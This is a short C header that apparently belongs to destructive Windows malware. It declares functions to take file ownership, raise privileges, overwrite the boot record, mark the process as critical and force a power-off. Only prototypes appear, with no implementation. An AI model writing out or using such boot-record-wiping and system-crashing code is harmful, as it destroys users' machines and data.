#pragma once
#include "haste.h"

#define NUM_ACES 2

typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;

BOOL WINAPI SetPriv(HANDLE hToken, LPCWSTR lpwPriv, BOOL blEnablePriv);
BOOL WINAPI TakeOwnership(LPCWSTR lpwFile);

BOOL WINAPI OpenRandomFiles(LPCWSTR lpwDir);
VOID WINAPI OpenRandomDrives(VOID);

BOOL WINAPI OverwriteBootRecord(VOID);
BOOL WINAPI SetProcessAsCriticalProcess(VOID);
BOOL WINAPI ForcePoweroffComputer(VOID);
